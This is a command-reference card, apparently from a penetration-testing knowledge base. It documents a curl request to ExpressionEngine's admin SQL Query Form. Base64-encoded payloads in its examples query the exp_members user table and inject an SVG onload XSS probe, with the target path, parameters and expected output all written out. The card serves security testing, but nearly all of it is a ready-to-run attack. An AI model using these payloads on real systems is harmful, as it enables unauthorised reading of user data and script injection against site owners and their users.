---
id: cmd-curl-send-query
data: curl "URL&thequery=BASE64_QUERY" -v
tags:
  - web
  - sqli
  - xss
type: command
output: HTTP response with query results or errors
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.207Z'
verified: false
validated: true
submitted: true
---
# curl-send-query

## Command

```bash
curl "URL&thequery=BASE64_QUERY" -v
```

## Description

Sends a GET request to the ExpressionEngine SQL Query Form endpoint with a Base64-encoded query in the `thequery` parameter, useful for testing SQLi or XSS exploitation remotely.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `URL` | Target endpoint, e.g., 'http://target.com/admin.php?/cp/utilities/query/run-query' | Yes |
| `BASE64_QUERY` | Base64-encoded SQL or payload | Yes |
| `-v` | Verbose output for headers and response | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/admin.php?/cp/utilities/query/run-query&thequery=c2VsZWN0ICogZnJvbSBleHBfbWVtYmVycw==" -v
```

### Advanced Usage

```bash
curl "http://target.com/admin.php?/cp/utilities/query/run-query&thequery=c2VsZWN0IDxzdmcgb25sb2FkPWFsZXJ0KDEpPg==" -v
```

## Expected Output

HTML response containing query results (for valid SQL) or unencoded error with reflected payload (for XSS), including verbose HTTP details.

## Related

- [[commands/base64-encode-query]]
